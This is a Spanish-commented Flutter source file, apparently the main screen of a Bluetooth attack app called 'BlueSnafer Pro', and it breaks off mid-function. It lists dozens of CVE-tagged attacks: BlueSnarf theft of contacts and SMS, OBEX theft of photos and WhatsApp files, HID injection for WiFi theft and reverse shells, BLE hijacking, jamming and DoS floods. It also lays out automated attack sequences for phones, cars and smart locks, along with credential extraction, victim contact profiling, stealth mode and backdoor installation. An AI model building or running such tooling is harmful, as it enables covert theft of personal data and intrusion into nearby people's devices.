// BlueSnafer Pro - UI UNIFICADA Y MODERNA
import 'dart:async';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'services/real_exploit_service.dart';
import 'services/integrated_ai_service.dart';
import 'services/attack_suggestion_engine.dart';
import 'services/permission_handler_service.dart';
import 'widgets/smart_suggestion_panel.dart';
import 'exploits/exploit_manager.dart';
import 'utils/device_utils.dart' as device_utils;
import 'file_browser_screen.dart';

// ==================== PANTALLA DE PERMISOS ====================
class PermissionScreen extends StatefulWidget {
  const PermissionScreen({super.key});
  @override
  State<PermissionScreen> createState() => _PermissionScreenState();
}

class _PermissionScreenState extends State<PermissionScreen> {
  Map<Permission, PermissionStatus> _permissions = {};
  bool _allGranted = false;
  bool _isRequesting = false;
  String _hardwareStatus = 'VERIFICANDO_SISTEMA...';
  bool _bluetoothAvailable = true;

  @override
  void initState() {
    super.initState();
    _initialize();
  }

  Future<void> _initialize() async {
    await _checkBluetoothHardware();
    await _checkPermissions();
  }

  Future<void> _checkBluetoothHardware() async {
    try {
      final permissionService = PermissionHandlerService();
      final hwInfo = await permissionService.checkBluetoothHardware();
      if (mounted) {
        setState(() {
          _bluetoothAvailable = hwInfo['available'] as bool? ?? false;
          _hardwareStatus = hwInfo['message'] as String? ?? 'ESTADO_DESCONOCIDO';
        });
      }
    } catch (e) {
      if (mounted) setState(() { _bluetoothAvailable = false; _hardwareStatus = 'ERROR_HW: $e'; });
    }
  }

  Future<void> _checkPermissions() async {
    final permissionService = PermissionHandlerService();
    final result = await permissionService.checkAllPermissions();
    if (mounted) {
      setState(() {
        _allGranted = result.allGranted;
        if (_bluetoothAvailable) _hardwareStatus = result.message;
        _updatePermissionMap();
      });
    }
  }

  Future<void> _updatePermissionMap() async {
    final scan = await Permission.bluetoothScan.status;
    final connect = await Permission.bluetoothConnect.status;
    final advertise = await Permission.bluetoothAdvertise.status;
    final location = await Permission.locationWhenInUse.status;
    final notification = await Permission.notification.status;

    if (mounted) {
      setState(() {
        _permissions = {
          Permission.bluetoothScan: scan,
          Permission.bluetoothConnect: connect,
          Permission.bluetoothAdvertise: advertise,
          Permission.locationWhenInUse: location,
          Permission.notification: notification,
        };
      });
    }
  }

  Future<void> _requestPermissions() async {
    if (_isRequesting) return;
    if (!_bluetoothAvailable) { _showError('⚠️ HARDWARE_NO_DETECTADO'); return; }
    setState(() => _isRequesting = true);
    try {
      final permissionService = PermissionHandlerService();
      final fullResult = await permissionService.requestAllPermissions();
      if (!fullResult.allGranted && fullResult.permanentlyDeniedPermissions.isNotEmpty) {
        _showError('🚫 PROTOCOLO_DENEGADO');
        await Future.delayed(const Duration(seconds: 1));
        await openAppSettings();
      }
      await _updatePermissionMap(); // Update map after request, not checkPermissions
      await _checkPermissions();
    } catch (e) {
      _showError('❌ FALLO_INICIALIZACIÓN: $e');
    } finally {
      if (mounted) setState(() => _isRequesting = false);
    }
  }

  void _showError(String message) {
    if (mounted) ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text(message), backgroundColor: Colors.redAccent));
  }

  // Permitir continuar aunque falten permisos no críticos
  bool get _canContinue {
    // Si todos concedidos, OK
    if (_allGranted) return true;
    // Solo necesitamos scan, connect y location para funcionar
    final scan = _permissions[Permission.bluetoothScan];
    final connect = _permissions[Permission.bluetoothConnect];
    final location = _permissions[Permission.locationWhenInUse];
    return (scan?.isGranted ?? false) && (connect?.isGranted ?? false) && (location?.isGranted ?? false);
  }

  Future<void> _enterApp() async {
    if (_canContinue) {
      if (mounted) {
        setState(() => _allGranted = true);
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    if (_allGranted) return const UnifiedAttackScreen();

    return Scaffold(
      body: Container(
        decoration: const BoxDecoration(
          gradient: LinearGradient(begin: Alignment.topLeft, end: Alignment.bottomRight, colors: [Color(0xFF020617), Color(0xFF0F172A)]),
        ),
        child: SafeArea(
          child: SingleChildScrollView(
            padding: const EdgeInsets.all(24),
            child: Column(
              children: [
                const SizedBox(height: 40),
                Container(
                  padding: const EdgeInsets.all(24),
                  decoration: BoxDecoration(color: Colors.indigoAccent.withOpacity(0.1), shape: BoxShape.circle),
                  child: const Icon(Icons.shield_outlined, size: 64, color: Colors.indigoAccent),
                ),
                const SizedBox(height: 24),
                const Text('Seguridad y Auditoría', style: TextStyle(color: Colors.white, fontSize: 24, fontWeight: FontWeight.bold)),
                const SizedBox(height: 8),
                const Text('Inicialización de protocolos de red', style: TextStyle(color: Colors.white54, fontSize: 14)),
                const SizedBox(height: 40),
                _buildStatusCard(),
                const SizedBox(height: 32),
                const Align(alignment: Alignment.centerLeft, child: Text('Accesos requeridos', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 16))),
                const SizedBox(height: 16),
                _buildSleekPermissionItem(Icons.radar, 'Escaneo', 'Detección de señales', _permissions[Permission.bluetoothScan]),
                _buildSleekPermissionItem(Icons.link, 'Conexión', 'Interfaz con objetivos', _permissions[Permission.bluetoothConnect]),
                _buildSleekPermissionItem(Icons.sensors, 'Ubicación', 'Triangulación BLE', _permissions[Permission.locationWhenInUse]),
                _buildSleekPermissionItem(Icons.notifications, 'Estado', 'Alertas de sistema', _permissions[Permission.notification]),
                const SizedBox(height: 40),
                // Botón principal
                SizedBox(
                  width: double.infinity,
                  child: ElevatedButton(
                    onPressed: _isRequesting ? null : (_allGranted || _canContinue ? _enterApp : _requestPermissions),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: (_allGranted || _canContinue) ? Colors.greenAccent : null,
                      foregroundColor: (_allGranted || _canContinue) ? Colors.black : null,
                    ),
                    child: _isRequesting
                      ? const SizedBox(width: 24, height: 24, child: CircularProgressIndicator(strokeWidth: 2, valueColor: AlwaysStoppedAnimation<Color>(Colors.white)))
                      : Text(
                          _allGranted
                            ? '✅ ACCESO CONCEDIDO - ENTRAR'
                            : _canContinue
                              ? 'CONTINUAR AL SISTEMA'
                              : 'OTORGAR PERMISOS',
                          style: const TextStyle(fontWeight: FontWeight.bold, letterSpacing: 1),
                        ),
                  ),
                ),
                // Botón secundario para saltar
                if (!_allGranted && !_isRequesting)
                  Padding(
                    padding: const EdgeInsets.only(top: 12),
                    child: TextButton(
                      onPressed: _canContinue ? _enterApp : null,
                      style: TextButton.styleFrom(
                        foregroundColor: _canContinue ? Colors.white38 : Colors.white12,
                      ),
                      child: const Text('Omitir y entrar (funcionalidad limitada)'),
                    ),
                  ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildStatusCard() {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(color: const Color(0xFF0F172A), borderRadius: BorderRadius.circular(16), border: Border.all(color: Colors.white.withOpacity(0.05))),
      child: Row(
        children: [
          Icon(_bluetoothAvailable ? Icons.bluetooth_connected : Icons.bluetooth_disabled, color: _bluetoothAvailable ? Colors.greenAccent : Colors.redAccent),
          const SizedBox(width: 16),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const Text('Hardware Bluetooth', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 12, color: Colors.white70)),
                Text(_hardwareStatus, style: TextStyle(color: _bluetoothAvailable ? Colors.greenAccent : Colors.redAccent, fontSize: 11)),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildSleekPermissionItem(IconData icon, String title, String desc, PermissionStatus? status) {
    final isGranted = status?.isGranted ?? false;
    final color = isGranted ? Colors.greenAccent : (status?.isPermanentlyDenied == true ? Colors.redAccent : Colors.white24);
    return Container(
      margin: const EdgeInsets.only(bottom: 12),
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(color: const Color(0xFF0F172A), borderRadius: BorderRadius.circular(16), border: Border.all(color: color.withOpacity(0.2))),
      child: Row(
        children: [
          Icon(icon, color: color, size: 24),
          const SizedBox(width: 16),
          Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [Text(title, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 14)), Text(desc, style: const TextStyle(color: Colors.white54, fontSize: 12))])),
          Icon(isGranted ? Icons.check_circle : Icons.radio_button_unchecked, color: color, size: 20),
        ],
      ),
    );
  }
}

// ==================== PANTALLA PRINCIPAL ====================
class UnifiedAttackScreen extends StatefulWidget {
  const UnifiedAttackScreen({super.key});
  @override
  State<UnifiedAttackScreen> createState() => _UnifiedAttackScreenState();
}

class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTickerProviderStateMixin {
  final RealExploitService _exploitService = RealExploitService();
  final IntegratedAIService _aiService = IntegratedAIService();
  final AttackSuggestionEngine _suggestionEngine = AttackSuggestionEngine();
  late TabController _tabController;
  StreamSubscription? _eventSubscription;
  final ScrollController _logScrollController = ScrollController();

  List<Map<String, dynamic>> _devices = [];
  Map<String, dynamic>? _selectedDevice;
  Map<String, dynamic> _discoveryData = {};
  List<String> _collectedData = []; // Datos reales recolectados (cap 100)
  List<Map<String, dynamic>> _obexFiles = []; // Archivos encontrados via OBEX
  List<Map<String, dynamic>> _sdpServices = []; // Servicios descubiertos via SDP
  List<Map<String, dynamic>> _pbapContacts = []; // Contactos extraidos via PBAP
  List<Map<String, dynamic>> _pbapCalls = []; // Historial llamadas via PBAP
  List<Map<String, dynamic>> _blueBorneResults = []; // Resultados BlueBorne
  List<Map<String, dynamic>> _gattMirrorResults = []; // Resultados Mirror Profile
  List<Map<String, dynamic>> _fullScanResults = []; // Resultados Full Scan
  List<Map<String, dynamic>> _atInjectionResults = []; // Resultados AT Injection
  bool _isAttacking = false; // Guard contra ataques concurrentes
  bool _isUnattendedRunning = false; // Modo desatendido activo
  bool _isScanning = false;
  List<String> _log = ['SISTEMA OPERATIVO - STANDBY'];
  String _aiPrediction = '';
  Suggestion? _currentSuggestion;
  List<String> _executedAttacks = [];
  Map<String, double> _successRates = {};
  bool _isStatusExpanded = false;

  // ==================== MEJORAS MODELO AUTOMÁTICO ====================
  
  // 1. Ejecución paralela de ataques
  final List<Future<void>> _activeAttacks = [];
  final Map<String, String> _attackQueue = {};
  final Map<String, int> _attackRetries = {};
  final Map<String, DateTime> _attackTimestamps = {};
  final Map<String, dynamic> _attackResults = {};
  
  // 2. Inteligencia adaptativa
  Map<String, dynamic> _deviceProfiles = {};
  Map<String, List<Map<String, dynamic>>> _patternAnalysis = {};
  
  // 3. Stealth mode
  bool _stealthMode = false;
  int _attackDelayMs = 1000;
  bool _maskDeviceIdentity = false;
  
  // 4. Gestión de errores con backoff exponencial
  int _baseDelayMs = 1000;
  double _backoffMultiplier = 2.0;
  int _maxRetries = 3;
  
  // 5. Análisis de red
  Map<String, dynamic> _networkAnalysis = {};
  List<Map<String, dynamic>> _networkTopology = [];
  
  // 6. Persistencia mejorada
  final Map<String, dynamic> _persistentData = {};
  bool _autoSaveEnabled = true;
  
  // 7. Reporte automático
  Map<String, dynamic> _automatedReport = {};
  final List<Map<String, dynamic>> _attackTimeline = [];
  final List<Map<String, dynamic>> _vulnerabilityReport = [];
  
  // 8. Modelo de predicción mejorado
  Map<String, double> _attackProbabilities = {};
  Map<String, String> _deviceFingerprints = {};
  
  // 9. Extracción avanzada
  final Map<String, List<String>> _extractedApps = {};
  final Map<String, List<String>> _extractedDirectories = {};
  final List<Map<String, dynamic>> _malwareIndicators = [];
  
  // 10. Backdoors y persistencia
  final List<Map<String, dynamic>> _installedBackdoors = [];
  final List<Map<String, dynamic>> _persistenceMechanisms = [];

  // ==================== MEJORAS IMPLEMENTADAS ====================
  
  // Configuración global del modo automático
  static const int MAX_PARALLEL_ATTEMPTS = 3;
  static const Duration BASE_BACKOFF_DELAY = Duration(seconds: 2);
  static const int MAX_FILES_PER_DIR = 15;
  static const bool ENABLE_PARALLEL_EXE = true;
  static const bool ENABLE_ADAPTIVE_AI = true;
  static const bool ENABLE_PATTERN_ANALYSIS = true;
  static const bool ENABLE_PERSISTENCE = false;
  static const bool ENABLE_NETWORK_ANALYSIS = true;

  // Estado de configuración
  bool _enableParallelExecution = true;
  bool _enableAdaptiveIntelligence = true;
  bool _enablePatternAnalysis = true;
  bool _enableNetworkAnalysis = true;
  bool _enablePersistence = false;
  
  // Métodos de ejecución paralela
  Future<List<Map<String, dynamic>>> _executeParallelAttacks(
    List<Map<String, dynamic>> attacks,
    String address,
    String displayName,
  ) async {
    if (!_enableParallelExecution) {
      return [];
    }
    
    final futures = attacks.map((attack) async {
      final type = attack['type'] as String;
      final command = attack['command'] as String?;
      final script = attack['script'] as String?;
      
      try {
        final result = await _exploitService.executeAttack(
          deviceAddress: address,
          type: type,
          command: command,
          script: script,
        );
        return {'type': type, 'success': result['success'] == true, 'result': result};
      } catch (e) {
        return {'type': type, 'success': false, 'error': e.toString()};
      }
    }).toList();
    
    return Future.wait(futures);
  }

  // Todas las técnicas de ataque disponibles (incluyendo CVEs modernos)
  static const allAttackTechniques = [
    // ===== RECONOCIMIENTO =====
    {'type': 'sdp_discover', 'command': 'scan', 'name': 'SDP', 'cve': '', 'category': 'recon', 'desc': 'Service Discovery Protocol'},
    
    // ===== EXTRACCIÓN DE DATOS (OBEX) =====
    {'type': 'pbap_extract', 'command': 'contacts', 'name': 'PBAP_CONTACTS', 'cve': '', 'category': 'data', 'desc': 'Phonebook - Contactos'},
    {'type': 'pbap_extract', 'command': 'call_history', 'name': 'PBAP_CALLS', 'cve': '', 'category': 'data', 'desc': 'Phonebook - Llamadas'},
    {'type': 'pbap_extract', 'command': 'all', 'name': 'PBAP_ALL', 'cve': '', 'category': 'data', 'desc': 'Phonebook Completo'},
    {'type': 'obex_get', 'command': 'telecom/pb.vcf', 'name': 'BLUESNARF', 'cve': 'CVE-2003-0300', 'category': 'data', 'desc': 'BlueSnarf - Robo contactos OBEX'},
    {'type': 'obex_get', 'command': 'telecom/cal.vcf', 'name': 'BLUESNARF_CAL', 'cve': 'CVE-2003-0300', 'category': 'data', 'desc': 'BlueSnarf - Calendario'},
    {'type': 'obex_get', 'command': 'telecom/sms.vpm', 'name': 'BLUESNARF_SMS', 'cve': 'CVE-2003-0300', 'category': 'data', 'desc': 'BlueSnarf - SMS'},
    {'type': 'file_exfil', 'command': 'scan', 'name': 'OBEX_SCAN', 'cve': '', 'category': 'data', 'desc': 'OBEX FTP Scan'},
    {'type': 'file_exfil_dir', 'command': 'DCIM', 'name': 'OBEX_DCIM', 'cve': '', 'category': 'data', 'desc': 'OBEX Fotos DCIM'},
    {'type': 'file_exfil_dir', 'command': 'Pictures', 'name': 'OBEX_PICTURES', 'cve': '', 'category': 'data', 'desc': 'OBEX Pictures'},
    {'type': 'file_exfil_dir', 'command': 'Download', 'name': 'OBEX_DOWNLOAD', 'cve': '', 'category': 'data', 'desc': 'OBEX Download'},
    {'type': 'file_exfil_dir', 'command': 'WhatsApp/Media', 'name': 'OBEX_WHATSAPP', 'cve': '', 'category': 'data', 'desc': 'OBEX WhatsApp'},
    {'type': 'file_exfil_dir', 'command': '../..', 'name': 'OBEX_TRAVERSAL', 'cve': 'CVE-2009-0244', 'category': 'data', 'desc': 'Directory Traversal OBEX'},
    
    // ===== INYECCIÓN (HID/AT) =====
    {'type': 'at_injection', 'name': 'AT_INJECTION', 'cve': 'CVE-2006-1367', 'category': 'injection', 'desc': 'AT Command Injection'},
    {'type': 'at_injection', 'command': 'ATD', 'name': 'AT_CALL', 'cve': 'CVE-2006-1367', 'category': 'injection', 'desc': 'AT Marcar número'},
    {'type': 'hid', 'script': 'notepad', 'name': 'HID_NOTEPAD', 'cve': 'CVE-2023-45866', 'category': 'injection', 'desc': 'HID - Abrir notepad'},
    {'type': 'hid', 'script': 'wifi', 'name': 'HID_WIFI', 'cve': 'CVE-2023-45866', 'category': 'injection', 'desc': 'HID - Exfiltrar WiFi'},
    {'type': 'hid', 'script': 'terminal', 'name': 'HID_TERMINAL', 'cve': 'CVE-2023-45866', 'category': 'injection', 'desc': 'HID - Abrir terminal'},
    {'type': 'hid', 'script': 'reverse', 'name': 'HID_REVERSE', 'cve': 'CVE-2023-45866', 'category': 'injection', 'desc': 'HID - Reverse shell'},
    {'type': 'hid_inject', 'name': 'HID_INJECT', 'cve': 'CVE-2023-45866', 'category': 'injection', 'desc': 'HID Keystroke Injection'},
    {'type': 'rfcomm_inject', 'name': 'BLUEBUGGING', 'cve': 'CVE-2003-0301', 'category': 'injection', 'desc': 'Bluebugging AT via RFCOMM'},
    
    // ===== BLE (Bluetooth Low Energy) =====
    {'type': 'btlejack', 'command': 'scan', 'name': 'BTLE_SCAN', 'cve': '', 'category': 'ble', 'desc': 'BLE Scan'},
    {'type': 'btlejack', 'command': 'sniff', 'name': 'BTLE_SNIFF', 'cve': '', 'category': 'ble', 'desc': 'BLE Sniff traffic'},
    {'type': 'btlejack', 'command': 'hijack', 'name': 'BTLE_HIJACK', 'cve': '', 'category': 'ble', 'desc': 'BLE Session hijack'},
    {'type': 'btlejack', 'command': 'jam', 'name': 'BTLE_JAM', 'cve': 'CVE-2020-12352', 'category': 'ble', 'desc': 'BLE Jam/DoS'},
    {'type': 'btlejack', 'command': 'mitm', 'name': 'BLE_MITM', 'cve': 'CVE-2023-24023', 'category': 'ble', 'desc': 'BLE MITM relay'},
    {'type': 'ble_pairing', 'command': 'justworks', 'name': 'BLE_JUSTWORKS', 'cve': 'CVE-2020-10135', 'category': 'ble', 'desc': 'BLE Pairing downgrade'},
    {'type': 'ble_exploit', 'command': 'secure', 'name': 'BLE_SC_BYPASS', 'cve': 'CVE-2019-9506', 'category': 'ble', 'desc': 'KNOB attack pairing'},
    {'type': 'ble_replay', 'name': 'BLE_REPLAY', 'cve': '', 'category': 'ble', 'desc': 'BLE GATT replay'},
    
    // ===== AVANZADOS/MODERNOS =====
    {'type': 'mirror_profile', 'name': 'MIRROR', 'cve': '', 'category': 'advanced', 'desc': 'Mirror Profile clone'},
    {'type': 'blueborne', 'name': 'BLUEBORNE', 'cve': 'CVE-2017-1000251', 'category': 'advanced', 'desc': 'BlueBorne RCE'},
    {'type': 'full_scan', 'name': 'FULL_SCAN', 'cve': '', 'category': 'advanced', 'desc': 'Full vulnerability scan'},
    {'type': 'spoofing', 'command': 'BlueSnafer Pro', 'name': 'SPOOFING', 'cve': '', 'category': 'advanced', 'desc': 'Device spoofing'},
    {'type': 'opp_push', 'command': '/test.txt', 'name': 'OPP_PUSH', 'cve': '', 'category': 'advanced', 'desc': 'OBEX Push file'},
    {'type': 'a2dp_inject', 'name': 'A2DP_INJECT', 'cve': '', 'category': 'advanced', 'desc': 'A2DP audio injection'},
    
    // ===== BYPASS AUTH =====
    {'type': 'bypass', 'command': 'quick_connect', 'name': 'BYPASS_QUICK', 'cve': 'CVE-2020-10135', 'category': 'bypass', 'desc': 'BIAS - Quick connect race'},
    {'type': 'bypass', 'command': 'mac_spoof', 'name': 'BYPASS_MAC', 'cve': '', 'category': 'bypass', 'desc': 'MAC spoofing'},
    {'type': 'bypass', 'command': 'obex_trust', 'name': 'BYPASS_OBEX', 'cve': '', 'category': 'bypass', 'desc': 'OBEX trust abuse'},
    {'type': 'pin_crack', 'name': 'PIN_BRUTE', 'cve': '', 'category': 'bypass', 'desc': 'PIN brute force'},
    
    // ===== DoS =====
    {'type': 'dos', 'command': 'gatt_flood', 'name': 'DOS_GATT', 'cve': 'CVE-2020-12351', 'category': 'dos', 'desc': 'GATT flood'},
    {'type': 'dos', 'command': 'l2cap_flood', 'name': 'DOS_L2CAP', 'cve': '', 'category': 'dos', 'desc': 'L2CAP flood'},
    {'type': 'dos', 'command': 'mtu_crash', 'name': 'DOS_MTU', 'cve': '', 'category': 'dos', 'desc': 'MTU crash'},
    {'type': 'dos', 'command': 'braktooth', 'name': 'BRACKTOOTH', 'cve': 'CVE-2021-28139', 'category': 'dos', 'desc': 'BrakTooth ESP32'},
  ];

  // Estrategia adaptativa por tipo de dispositivo
  List<Map<String, dynamic>> _getOptimizedAttackSequence(String deviceType) {
    final strategies = {
      'smartphone': [
        {'type': 'sdp_discover', 'command': 'scan'},
        {'type': 'pbap_extract', 'command': 'all'},
        {'type': 'file_exfil', 'command': 'scan'},
        {'type': 'file_exfil_dir', 'command': 'DCIM'},
        {'type': 'file_exfil_dir', 'command': 'Pictures'},
        {'type': 'file_exfil_dir', 'command': 'WhatsApp'},
        {'type': 'at_injection'},
        {'type': 'hid', 'script': 'wifi'},
        {'type': 'mirror_profile'},
        {'type': 'spoofing', 'command': 'BlueSnafer Pro'},
        {'type': 'full_scan'},
        {'type': 'bypass', 'command': 'quick_connect'},
      ],
      'iot': [
        {'type': 'sdp_discover', 'command': 'scan'},
        {'type': 'file_exfil', 'command': 'scan'},
        {'type': 'btlejack', 'command': 'scan'},
        {'type': 'btlejack', 'command': 'sniff'},
        {'type': 'btlejack', 'command': 'jam'},
        {'type': 'dos', 'command': 'gatt_flood'},
        {'type': 'dos', 'command': 'l2cap_flood'},
        {'type': 'full_scan'},
      ],
      'laptop': [
        {'type': 'sdp_discover', 'command': 'scan'},
        {'type': 'file_exfil', 'command': 'scan'},
        {'type': 'file_exfil_dir', 'command': 'Documents'},
        {'type': 'at_injection'},
        {'type': 'hid', 'script': 'terminal'},
        {'type': 'hid', 'script': 'reverse'},
        {'type': 'spoofing', 'command': 'BlueSnafer Pro'},
        {'type': 'full_scan'},
        {'type': 'bypass', 'command': 'mac_spoof'},
      ],
      'car': [
        {'type': 'sdp_discover', 'command': 'scan'},
        {'type': 'btlejack', 'command': 'scan'},
        {'type': 'btlejack', 'command': 'sniff'},
        {'type': 'btlejack', 'command': 'hijack'},
        {'type': 'dos', 'command': 'l2cap_flood'},
        {'type': 'dos', 'command': 'gatt_flood'},
        {'type': 'full_scan'},
      ],
      'smart_lock': [
        {'type': 'sdp_discover', 'command': 'scan'},
        {'type': 'btlejack', 'command': 'sniff'},
        {'type': 'btlejack', 'command': 'jam'},
        {'type': 'dos', 'command': 'gatt_flood'},
        {'type': 'dos', 'command': 'mtu_crash'},
        {'type': 'full_scan'},
      ],
      'wearable': [
        {'type': 'sdp_discover', 'command': 'scan'},
        {'type': 'pbap_extract', 'command': 'contacts'},
        {'type': 'file_exfil', 'command': 'scan'},
        {'type': 'file_exfil_dir', 'command': 'Pictures'},
        {'type': 'btlejack', 'command': 'scan'},
        {'type': 'full_scan'},
      ],
    };
    
    return strategies[deviceType] ?? strategies['smartphone']!;
  }

  // Obtener lista de nombres de técnicas para el reporte
  List<String> _getAttackNames(List<Map<String, dynamic>> attacks) {
    return attacks.map((a) {
      final name = a['name'] as String?;
      if (name != null) return name;
      final type = a['type'] as String? ?? '';
      final cmd = a['command'] as String? ?? '';
      final script = a['script'] as String? ?? '';
      if (script.isNotEmpty) return '${type}_$script';
      if (cmd.isNotEmpty) return '${type}_$cmd';
      return type;
    }).toList();
  }

  // Análisis de patrones en datos extraídos
  Future<Map<String, dynamic>> _analyzeExtractedPatterns() async {
    final patterns = <String, dynamic>{};
    
    // Analizar contactos
    if (_pbapContacts.isNotEmpty) {
      final workEmails = <String>[];
      final personalEmails = <String>[];
      final phoneNumbers = <String>[];
      final socialMedia = <String>[];
      
      for (final contact in _pbapContacts) {
        final email = contact['email']?.toString().toLowerCase() ?? '';
        final phone = contact['phone']?.toString() ?? '';
        
        if (email.contains('work') || email.contains('company') || email.contains('@company.com')) {
          workEmails.add(email);
        } else if (email.isNotEmpty) {
          personalEmails.add(email);
        }
        
        if (phone.isNotEmpty) {
          phoneNumbers.add(phone);
        }
        
        // Detectar redes sociales en notas
        final notes = contact['notes']?.toString().toLowerCase() ?? '';
        if (notes.contains('whatsapp') || notes.contains('telegram') || notes.contains('instagram')) {
          socialMedia.add(notes);
        }
      }
      
      patterns['work_emails'] = workEmails;
      patterns['personal_emails'] = personalEmails;
      patterns['phone_numbers'] = phoneNumbers;
      patterns['social_media'] = socialMedia;
      patterns['contact_count'] = _pbapContacts.length;
    }
    
    // Analizar archivos
    if (_obexFiles.isNotEmpty) {
      final imageFiles = <Map<String, dynamic>>[];
      final docFiles = <Map<String, dynamic>>[];
      final videoFiles = <Map<String, dynamic>>[];
      final contactFiles = <Map<String, dynamic>>[];
      final dbFiles = <Map<String, dynamic>>[];
      
      for (final file in _obexFiles) {
        final name = file['name']?.toString().toLowerCase() ?? '';
        final size = file['size'] ?? 0;
        
        if (name.endsWith('.jpg') || name.endsWith('.jpeg') || name.endsWith('.png') || name.endsWith('.gif')) {
          imageFiles.add(file);
        } else if (name.endsWith('.pdf') || name.endsWith('.doc') || name.endsWith('.docx')) {
          docFiles.add(file);
        } else if (name.endsWith('.mp4') || name.endsWith('.mov') || name.endsWith('.avi')) {
          videoFiles.add(file);
        } else if (name.endsWith('.vcf') || name.endsWith('.csv')) {
          contactFiles.add(file);
        } else if (name.endsWith('.db') || name.endsWith('.sqlite')) {
          dbFiles.add(file);
        }
      }
      
      patterns['images'] = imageFiles.length;
      patterns['documents'] = docFiles.length;
      patterns['videos'] = videoFiles.length;
      patterns['contacts_files'] = contactFiles.length;
      patterns['databases'] = dbFiles.length;
      patterns['total_files'] = _obexFiles.length;
    }
    
    // Analizar llamadas
    if (_pbapCalls.isNotEmpty) {
      final missedCalls = _pbapCalls.where((c) => c['type'] == 'missed').length;
      final incomingCalls = _pbapCalls.where((c) => c['type'] == 'incoming').length;
      final outgoingCalls = _pbapCalls.where((c) => c['type'] == 'outgoing').length;
      
      patterns['missed_calls'] = missedCalls;
      patterns['incoming_calls'] = incomingCalls;
      patterns['outgoing_calls'] = outgoingCalls;
      patterns['total_calls'] = _pbapCalls.length;
    }
    
    _appendLog('🔍 Análisis de patrones: ${patterns.length} categorías encontradas');
    return patterns;
  }

  // Extracción de datos de aplicaciones
  Future<int> _extractAppData(String address, String displayName) async {
    if (!_enableNetworkAnalysis) return 0;
    
    int extractedFiles = 0;
    final appDirectories = [
      'Android/data',
      'Android/media', 
      'Android/obb',
      'Android/files',
    ];
    
    for (final dir in appDirectories) {
      if (!_isUnattendedRunning) return extractedFiles;
      
      try {
        final result = await _exploitService.executeAttack(
          deviceAddress: address,
          type: 'app_data_scan',
          command: dir,
        );
        
        if (result['success'] == true) {
          final files = result['files'] as List? ?? [];
          extractedFiles += files.length;
          _appendLog('  📱 $dir: ${files.length} archivos de app');
          
          // Guardar en estructura
          _extractedApps[address] ??= [];
          _extractedApps[address]!.addAll(files.map((f) => f.toString()));
        }
      } catch (e) {
        // Silenciar errores individuales
      }
    }
    
    return extractedFiles;
  }

  // Análisis de red del dispositivo
  Future<Map<String, dynamic>> _extractNetworkInfo(String address) async {
    if (!_enableNetworkAnalysis) return {};
    
    final networkInfo = <String, dynamic>{};
    
    try {
      // Escanear dispositivos conectados
      final connectedResult = await _exploitService.executeAttack(
        deviceAddress: address,
        type: 'network_scan',
        command: 'connected_devices',
      );
      
      if (connectedResult['success'] == true) {
        networkInfo['connected_devices'] = connectedResult['devices'];
        _appendLog('  🌐 ${(connectedResult['devices'] as List?)?.length ?? 0} dispositivos conectados');
      }
    } catch (e) {
      networkInfo['connected_devices_error'] = e.toString();
    }
    
    try {
      // Escanear redes WiFi disponibles
      final wifiResult = await _exploitService.executeAttack(
        deviceAddress: address,
        type: 'wifi_scan',
        command: 'available_networks',
      );
      
      if (wifiResult['success'] == true) {
        networkInfo['wifi_networks'] = wifiResult['networks'];
        _appendLog('  📶 ${(wifiResult['networks'] as List?)?.length ?? 0} redes WiFi detectadas');
      }
    } catch (e) {
      networkInfo['wifi_networks_error'] = e.toString();
    }
    
    try {
      // Extraer credenciales guardadas
      final credResult = await _exploitService.executeAttack(
        deviceAddress: address,
        type: 'credential_extraction',
        command: 'wifi_credentials',
      );
      
      if (credResult['success'] == true) {
        networkInfo['saved_credentials'] = credResult['credentials'];
        _appendLog('  🔑 ${(credResult['credentials'] as List?)?.length ?? 0} credenciales WiFi');
      }
    } catch (e) {
      networkInfo['credentials_error'] = e.toString();
    }
    
    if (networkInfo.isNotEmpty) {
      _networkAnalysis[address] = networkInfo;
    }
    
    return networkInfo;
  }

  // Instalar mecanismo de persistencia
  Future<bool> _installPersistenceMechanism(String address, String displayName) async {
    if (!_enablePersistence) return false;
    
    try {
      // 1. Crear servicio persistente
      final serviceResult = await _exploitService.executeAttack(
        deviceAddress: address,
        type: 'install_persistent_service',
        script: 'BluetoothAutoConnectService',
      );
      
      if (serviceResult['success'] == true) {
        _installedBackdoors.add({
          'address': address,
          'name': displayName,
          'type': 'persistent_service',
          'timestamp': DateTime.now().toIso8601String(),
        });
        
        // 2. Configurar auto-conexión
        await _exploitService.executeAttack(
          deviceAddress: address,
          type: 'configure_autoconnect',
          command: 'BlueSnafer_Pro_AutoConnect',
        );
        
        _persistenceMechanisms.add({
          'address': address,
          'mechanism': 'auto_connect',
          'timestamp': DateTime.now().toIso8601String(),
        });
        
        _appendLog('  🕵️ Persistencia instalada en $displayName');
        return true;
      }
    } catch (e) {
      _appendLog('  ❌ Error instalando persistencia: $e');
    }
    
    return false;
  }

  // Predicción de vulnerabilidades con IA
  Future<Map<String, dynamic>> _predictVulnerabilities(String address) async {
    if (!_enableAdaptiveIntelligence || _selectedDevice == null) {
      return {};
    }
    
    try {
      final prediction = await _aiService.runCompleteSecurityAnalysis(
        deviceAddress: address,
        deviceData: _selectedDevice!,
      );
      
      _attackProbabilities = {
        for (final attack in prediction.optimalAttackStrategy.recommendedAttacks)
          attack.attackType: attack.confidence,
      };
      
      return {
        'high_risk_vulns': prediction.optimalAttackStrategy.recommendedAttacks
            .where((a) => a.confidence > 0.7)
            .map((a) => a.attackType)
            .toList(),
        'success_probability': prediction.confidence,
        'recommended_sequence': prediction.optimalAttackStrategy.recommendedAttacks
            .take(5)
            .map((a) => a.attackType)
            .toList(),
